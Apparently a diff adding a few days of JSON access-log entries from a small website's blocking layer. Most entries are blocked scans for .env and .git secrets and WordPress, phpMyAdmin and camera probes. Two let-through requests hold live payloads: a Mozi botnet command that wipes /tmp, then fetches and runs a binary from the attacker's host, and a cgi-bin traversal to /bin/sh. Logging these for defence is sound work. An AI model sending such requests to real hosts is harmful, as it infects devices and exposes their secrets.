+{"time": "2026-08-06 17:10:15", "ip": "66.132.172.134", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-06 17:10:20", "ip": "66.132.172.134", "path": "/khqh7pq7g8", "action": "allowed"}
+{"time": "2026-08-06 17:10:26", "ip": "66.132.172.134", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-06 17:16:44", "ip": "104.252.149.181", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 17:16:45", "ip": "104.252.149.181", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 17:35:51", "ip": "74.249.128.154", "path": "/developmentserver/metadatauploader", "action": "allowed"}
+{"time": "2026-08-06 17:45:11", "ip": "195.184.76.229", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 17:48:37", "ip": "195.184.76.110", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-06 18:01:16", "ip": "193.25.218.171", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 18:01:17", "ip": "193.25.218.171", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 18:05:32", "ip": "45.39.17.176", "path": "/.env", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-06 18:05:33", "ip": "45.39.17.176", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 19:18:22", "ip": "94.154.43.254", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 19:18:48", "ip": "147.185.132.171", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 20:19:51", "ip": "51.75.19.210", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 20:19:51", "ip": "51.75.19.210", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 20:19:52", "ip": "51.75.19.210", "path": "/env/.env", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-06 20:19:52", "ip": "51.75.19.210", "path": "/app/.env", "action": "attack_blocked", "attempt": 3}
+{"time": "2026-08-06 20:19:52", "ip": "51.75.19.210", "path": "/api/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 20:19:52", "ip": "51.75.19.210", "path": "/backend/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 20:19:53", "ip": "51.75.19.210", "path": "/config/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 20:19:53", "ip": "51.75.19.210", "path": "/admin/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 20:19:53", "ip": "51.75.19.210", "path": "/src/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 20:19:53", "ip": "51.75.19.210", "path": "/settings/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 20:19:54", "ip": "51.75.19.210", "path": "/server/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 20:19:54", "ip": "51.75.19.210", "path": "/private/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 20:19:54", "ip": "51.75.19.210", "path": "/storage/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-06 21:02:33", "ip": "45.198.224.26", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 21:16:01", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 22:09:56", "ip": "82.29.214.100", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 22:09:57", "ip": "82.29.214.100", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 23:12:24", "ip": "40.124.184.7", "path": "/actuator/health", "action": "allowed"}
+{"time": "2026-08-06 23:28:31", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "allowed"}
+{"time": "2026-08-06 23:28:31", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "allowed"}
+{"time": "2026-08-06 23:28:31", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "allowed"}
+{"time": "2026-08-06 23:28:36", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-06 23:28:36", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-06 23:38:08", "ip": "66.249.69.38", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-07 00:13:45", "ip": "195.172.211.205", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 00:13:46", "ip": "195.172.211.205", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 00:47:15", "ip": "216.180.246.216", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 00:47:48", "ip": "216.180.246.216", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 00:48:22", "ip": "216.180.246.216", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 00:52:20", "ip": "216.180.246.216", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 00:52:28", "ip": "216.180.246.216", "path": "/manage/account/login", "action": "allowed"}
+{"time": "2026-08-07 01:07:07", "ip": "82.25.213.8", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 01:07:09", "ip": "82.25.213.8", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 01:10:06", "ip": "198.235.24.125", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 01:56:42", "ip": "185.93.89.130", "path": "/.git/config", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 02:38:00", "ip": "74.248.97.169", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-07 02:40:13", "ip": "74.248.97.169", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-07 02:44:49", "ip": "178.128.242.39", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 02:44:55", "ip": "178.128.242.39", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-07 02:52:44", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 03:04:35", "ip": "205.210.31.27", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 04:25:28", "ip": "150.107.38.234", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 04:25:36", "ip": "150.107.38.234", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-07 04:27:33", "ip": "150.107.38.234", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-07 04:42:53", "ip": "141.95.19.213", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 04:42:54", "ip": "141.95.19.213", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 04:42:54", "ip": "141.95.19.213", "path": "/env/.env", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-07 04:42:54", "ip": "141.95.19.213", "path": "/app/.env", "action": "attack_blocked", "attempt": 3}
+{"time": "2026-08-07 04:42:54", "ip": "141.95.19.213", "path": "/api/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 04:42:55", "ip": "141.95.19.213", "path": "/backend/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 04:42:55", "ip": "141.95.19.213", "path": "/config/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 04:42:55", "ip": "141.95.19.213", "path": "/admin/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 04:42:55", "ip": "141.95.19.213", "path": "/src/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 04:42:56", "ip": "141.95.19.213", "path": "/settings/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 04:42:56", "ip": "141.95.19.213", "path": "/server/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 04:42:56", "ip": "141.95.19.213", "path": "/private/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 04:42:56", "ip": "141.95.19.213", "path": "/storage/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-07 05:09:56", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "allowed"}
+{"time": "2026-08-07 05:09:56", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "allowed"}
+{"time": "2026-08-07 05:09:56", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "allowed"}
+{"time": "2026-08-07 05:10:01", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-07 05:10:01", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-07 05:28:41", "ip": "104.252.44.92", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 05:28:42", "ip": "104.252.44.92", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 05:50:23", "ip": "5.61.209.44", "path": "/SDK/webLanguage", "action": "allowed"}
+{"time": "2026-08-07 05:58:28", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 06:01:27", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 07:40:00", "ip": "207.90.244.14", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 07:40:08", "ip": "207.90.244.14", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-07 07:40:14", "ip": "207.90.244.14", "path": "/sitemap.xml", "action": "allowed"}
+{"time": "2026-08-07 07:56:49", "ip": "148.153.56.58", "path": "/1Ynd", "action": "allowed"}
+{"time": "2026-08-07 07:56:49", "ip": "148.153.56.58", "path": "/WEvK", "action": "allowed"}
+{"time": "2026-08-07 07:56:52", "ip": "148.153.56.58", "path": "/aab8", "action": "allowed"}
+{"time": "2026-08-07 07:56:54", "ip": "148.153.56.58", "path": "/aab9", "action": "allowed"}
+{"time": "2026-08-07 08:01:35", "ip": "20.80.80.29", "path": "/druid/index.html", "action": "allowed"}
+{"time": "2026-08-07 08:20:48", "ip": "217.117.166.65", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 08:20:49", "ip": "217.117.166.65", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 08:21:58", "ip": "64.62.156.132", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 08:29:07", "ip": "64.62.156.132", "path": "/geoserver/web/", "action": "allowed"}
+{"time": "2026-08-07 08:41:12", "ip": "198.105.100.26", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 08:41:13", "ip": "198.105.100.26", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 09:27:49", "ip": "101.34.59.115", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 09:46:26", "ip": "105.159.233.120", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 09:46:27", "ip": "105.159.233.120", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 10:15:23", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "allowed"}
+{"time": "2026-08-07 10:15:23", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "allowed"}
+{"time": "2026-08-07 10:15:23", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "allowed"}
+{"time": "2026-08-07 10:15:28", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-07 10:15:28", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-07 10:42:55", "ip": "66.249.69.40", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-07 10:45:13", "ip": "139.9.163.56", "path": "/wsman?PSVersion=5.1.19041.1", "action": "allowed"}
+{"time": "2026-08-07 10:46:29", "ip": "165.154.11.202", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 11:30:12", "ip": "66.132.195.115", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 11:30:20", "ip": "66.132.195.115", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-07 11:30:30", "ip": "66.132.195.115", "path": "/.well-known/security.txt", "action": "allowed"}
+{"time": "2026-08-07 11:30:38", "ip": "66.132.195.115", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-07 11:30:43", "ip": "66.132.195.115", "path": "/pdaibtqq8fiemplp", "action": "allowed"}
+{"time": "2026-08-07 11:30:50", "ip": "66.132.195.115", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-07 12:43:11", "ip": "92.112.82.240", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 12:43:11", "ip": "92.112.82.240", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 12:50:07", "ip": "101.34.59.115", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 13:08:16", "ip": "52.180.157.88", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 13:31:05", "ip": "104.252.136.225", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 13:31:06", "ip": "104.252.136.225", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 14:58:56", "ip": "47.251.253.223", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 14:58:57", "ip": "47.251.253.223", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 15:29:21", "ip": "193.25.217.70", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 16:50:33", "ip": "64.227.72.113", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 16:50:38", "ip": "64.227.72.113", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-07 17:01:50", "ip": "94.154.43.140", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 17:11:31", "ip": "32.193.246.97", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 17:22:40", "ip": "154.6.8.204", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 17:22:41", "ip": "154.6.8.204", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 18:21:34", "ip": "205.210.31.78", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 19:29:50", "ip": "92.113.119.46", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 19:29:50", "ip": "92.113.119.46", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 20:03:33", "ip": "5.83.129.177", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 20:08:05", "ip": "198.235.24.134", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 20:41:37", "ip": "205.210.31.131", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 20:45:48", "ip": "82.23.203.66", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 20:45:49", "ip": "82.23.203.66", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 21:59:30", "ip": "188.166.68.252", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 22:00:39", "ip": "172.166.156.161", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 22:12:14", "ip": "20.215.186.32", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-07 22:39:05", "ip": "160.119.76.24", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 22:46:46", "ip": "160.119.76.24", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 22:46:51", "ip": "160.119.76.24", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-07 22:46:57", "ip": "160.119.76.24", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-07 22:47:00", "ip": "160.119.76.24", "path": "/.well-known/security.txt", "action": "allowed"}
+{"time": "2026-08-07 23:17:54", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-07 23:35:13", "ip": "20.102.117.125", "path": "/developmentserver/metadatauploader", "action": "allowed"}
+{"time": "2026-08-07 23:42:47", "ip": "217.69.127.42", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 23:42:47", "ip": "217.69.127.42", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-07 23:45:45", "ip": "172.166.156.161", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-07 23:52:33", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "allowed"}
+{"time": "2026-08-07 23:52:33", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "allowed"}
+{"time": "2026-08-07 23:52:33", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "allowed"}
+{"time": "2026-08-07 23:52:38", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-07 23:52:38", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-08 02:34:48", "ip": "134.209.94.51", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 02:34:53", "ip": "134.209.94.51", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-08 02:56:51", "ip": "114.235.174.131", "path": "/shell?cd+/tmp;rm+-rf+*;wget+http://114.235.174.131:59025/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws", "action": "allowed"}
+{"time": "2026-08-08 03:22:46", "ip": "82.21.248.229", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 03:22:47", "ip": "82.21.248.229", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 04:16:40", "ip": "86.38.26.147", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 04:16:41", "ip": "86.38.26.147", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 04:42:07", "ip": "4.225.203.22", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-08 04:44:52", "ip": "4.225.203.22", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-08 04:45:36", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "allowed"}
+{"time": "2026-08-08 04:45:36", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "allowed"}
+{"time": "2026-08-08 04:45:36", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "allowed"}
+{"time": "2026-08-08 04:45:41", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-08 04:45:41", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-08 04:53:06", "ip": "18.218.118.203", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 04:55:22", "ip": "18.218.118.203", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 05:51:49", "ip": "65.49.1.152", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 05:57:33", "ip": "65.49.1.152", "path": "/geoserver/web/", "action": "allowed"}
+{"time": "2026-08-08 06:29:09", "ip": "20.250.24.46", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-08 06:31:24", "ip": "20.250.24.46", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-08 06:44:42", "ip": "85.217.149.26", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 07:08:56", "ip": "181.214.37.98", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 07:08:57", "ip": "181.214.37.98", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 07:24:28", "ip": "111.231.101.182", "path": "/phpmyadmin/index.php", "action": "allowed"}
+{"time": "2026-08-08 07:24:33", "ip": "111.231.101.182", "path": "/pmd/index.php", "action": "allowed"}
+{"time": "2026-08-08 07:24:39", "ip": "111.231.101.182", "path": "/phpmyadmin4.8.5/index.php", "action": "allowed"}
+{"time": "2026-08-08 08:21:56", "ip": "207.46.13.229", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-08 08:37:13", "ip": "207.46.13.229", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-08 08:48:32", "ip": "207.46.13.229", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-08 08:48:41", "ip": "40.77.167.55", "path": "/Bootstrap-5-portfolio-template/images/campanies/campany-4.png", "action": "allowed"}
+{"time": "2026-08-08 09:40:10", "ip": "185.198.37.220", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 09:40:11", "ip": "185.198.37.220", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 09:42:48", "ip": "47.251.81.112", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 09:42:49", "ip": "47.251.81.112", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 09:53:11", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "allowed"}
+{"time": "2026-08-08 09:53:11", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "allowed"}
+{"time": "2026-08-08 09:53:11", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "allowed"}
+{"time": "2026-08-08 09:53:16", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-08 09:53:16", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-08 11:26:06", "ip": "40.77.167.16", "path": "/Bootstrap-5-portfolio-template/images/campanies/campany-2.png", "action": "allowed"}
+{"time": "2026-08-08 11:34:27", "ip": "45.198.224.26", "path": "/login", "action": "allowed"}
+{"time": "2026-08-08 11:35:12", "ip": "202.125.94.185", "path": "/admin/config.php", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-08 11:54:55", "ip": "66.132.172.105", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 11:55:05", "ip": "66.132.172.105", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-08 11:57:28", "ip": "66.132.172.105", "path": "/sitemap.xml", "action": "allowed"}
+{"time": "2026-08-08 11:57:47", "ip": "66.132.172.105", "path": "/6sm90ut9oa8c6kz3", "action": "allowed"}
+{"time": "2026-08-08 12:59:23", "ip": "52.167.144.237", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-7.jpg", "action": "allowed"}
+{"time": "2026-08-08 12:59:53", "ip": "52.167.144.237", "path": "/Bootstrap-5-portfolio-template/images/testimonials/client-1.jpg", "action": "allowed"}
+{"time": "2026-08-08 13:45:09", "ip": "45.38.114.116", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 13:45:09", "ip": "45.38.114.116", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 14:49:42", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "allowed"}
+{"time": "2026-08-08 14:49:42", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "allowed"}
+{"time": "2026-08-08 14:49:42", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "allowed"}
+{"time": "2026-08-08 14:49:47", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-08 14:49:47", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-08 15:36:43", "ip": "217.154.153.212", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh", "action": "allowed"}
+{"time": "2026-08-08 15:44:38", "ip": "82.21.245.33", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 15:44:40", "ip": "82.21.245.33", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 16:03:11", "ip": "40.77.167.8", "path": "/Bootstrap-5-portfolio-template/images/arts/intro-section-illustration.png", "action": "allowed"}
+{"time": "2026-08-08 16:26:22", "ip": "52.167.144.215", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-3.jpg", "action": "allowed"}
+{"time": "2026-08-08 16:34:43", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 16:45:19", "ip": "158.94.211.230", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 17:04:34", "ip": "193.25.167.129", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 17:04:35", "ip": "193.25.167.129", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 17:09:22", "ip": "98.94.81.30", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 18:10:48", "ip": "205.210.31.149", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 18:46:59", "ip": "52.167.144.173", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-4.jpg", "action": "allowed"}
+{"time": "2026-08-08 19:19:01", "ip": "52.188.231.113", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 19:20:45", "ip": "8.130.165.94", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 19:30:34", "ip": "47.88.87.97", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 19:30:42", "ip": "47.88.78.6", "path": "/Public/home/js/check.js", "action": "allowed"}
+{"time": "2026-08-08 19:30:51", "ip": "47.254.16.187", "path": "/static/admin/javascript/hetong.js", "action": "allowed"}
+{"time": "2026-08-08 20:04:35", "ip": "205.210.31.171", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 20:10:38", "ip": "43.228.157.169", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 20:26:03", "ip": "64.227.190.95", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 20:26:08", "ip": "64.227.190.95", "path": "/wp-login.php", "action": "allowed"}
+{"time": "2026-08-08 20:26:13", "ip": "64.227.190.95", "path": "/wp/wp-login.php", "action": "allowed"}
+{"time": "2026-08-08 20:26:18", "ip": "64.227.190.95", "path": "/wordpress/wp-login.php", "action": "backend_error", "error": "[Errno 104] Connection reset by peer"}
+{"time": "2026-08-08 20:44:16", "ip": "40.77.167.20", "path": "/Bootstrap-5-portfolio-template/images/services/service-3.png", "action": "allowed"}
+{"time": "2026-08-08 20:51:46", "ip": "104.253.212.175", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 20:51:47", "ip": "104.253.212.175", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 20:58:18", "ip": "40.77.167.27", "path": "/Bootstrap-5-portfolio-template/images/campanies/campany-3.png", "action": "allowed"}
+{"time": "2026-08-08 21:11:06", "ip": "45.194.70.253", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 21:11:12", "ip": "45.194.70.253", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-08 21:11:17", "ip": "45.194.70.253", "path": "/sitemap.xml", "action": "allowed"}
+{"time": "2026-08-08 21:11:17", "ip": "45.194.70.253", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-08 21:36:21", "ip": "52.167.144.174", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-1.jpg", "action": "allowed"}
+{"time": "2026-08-08 21:46:12", "ip": "52.167.144.176", "path": "/Bootstrap-5-portfolio-template/images/services/service-2.png", "action": "allowed"}
+{"time": "2026-08-08 21:58:55", "ip": "194.187.176.87", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 21:59:07", "ip": "194.187.176.232", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-08 22:19:21", "ip": "18.218.118.203", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 22:19:30", "ip": "15.237.190.156", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 22:22:38", "ip": "18.218.118.203", "path": "/", "action": "allowed"}
+{"time": "2026-08-08 23:13:00", "ip": "173.0.10.254", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-08 23:13:01", "ip": "173.0.10.254", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-08 23:23:22", "ip": "40.77.167.28", "path": "/Bootstrap-5-portfolio-template/images/campanies/campany-4.png", "action": "allowed"}
